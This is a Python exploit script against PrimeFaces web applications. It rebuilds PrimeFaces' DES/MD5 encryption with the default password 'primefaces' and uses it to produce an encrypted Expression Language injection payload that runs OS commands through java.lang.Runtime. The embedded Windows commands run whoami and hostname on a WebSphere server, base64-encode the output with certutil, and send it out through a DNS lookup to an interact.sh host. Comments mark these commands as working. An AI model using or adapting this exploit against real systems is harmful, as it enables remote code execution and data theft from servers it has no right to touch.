import requests
from Crypto.Hash import MD5
from Crypto.Cipher import DES
import base64
import time
import urllib

def encrypt(data, password):
    # Padding clear-text using PKCS5 algo
    padding = 8 - len(data) % 8
    data += chr(padding) * padding
    # IV and "iterations count" extracted from primefaces sourcecode
    iterations = 19
    iv = b'\xa9\x9b\xc8\x32\x56\x34\xe3\x03'
    hasher = MD5.new()
    hasher.update(password)
    hasher.update(iv)
    result = hasher.digest()

    for i in range(1, iterations):
        hasher = MD5.new()
        hasher.update(result)
        result = hasher.digest()

    cipher = DES.new(result[:8], DES.MODE_CBC, result[8:16])
    encrypted = cipher.encrypt(data)
    #print ("[*] Generated Encrypted Payload: " + str(base64.b64encode(encrypted)))
    return str(base64.b64encode(encrypted))

def main():
    payloadEL =  '${facesContext.getExternalContext().getSession(true).setAttribute("processo_runtime",facesContext.getExternalContext().getClass().forName("java.lang.Runtime").getDeclaredMethods()[0].invoke())}'
    payloadEL += '${facesContext.getExternalContext().getSession(true).setAttribute("processo",facesContext.getExternalContext().getSession(true).getAttribute("processo_runtime").exec("XXXXXXXXXX"))}'

    #cmd = 'cmd /v /c "hostname > D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outc && certutil -encode D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outc D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outc2 && findstr /L /V "CERTIFICATE" D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outc2 > D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outc3 && set /p MYVAR=<D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outc3 && set FINAL=!MYVAR!.c2qsmk5e8vlq9tblmpu0cn4hs5ayyyyyn.interact.sh && nslookup !FINAL!"'    #working
    cmd = 'cmd /v /c "whoami > D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outd && certutil -encode D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outd D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outd2 && findstr /L /V "CERTIFICATE" D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outd2 > D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outd3 && set /p MYVAR=<D:\\\\WebSphere\\\\AppServer\\\\profiles\\\\AppSrv01\\\\temp\\\\outd3 && set FINAL=!MYVAR!.c2qsmk5e8vlq9tblmpu0cn4hs5ayyyyyn.interact.sh && nslookup !FINAL!"' #working

    cmd = cmd.replace('"', '\\"')
    payload = encrypt(payloadEL.replace('XXXXXXXXXX',cmd), "primefaces")
    print(payload)
    print("\n\n")
    print(urllib.quote(payload))
if __name__ == '__main__':
  main()
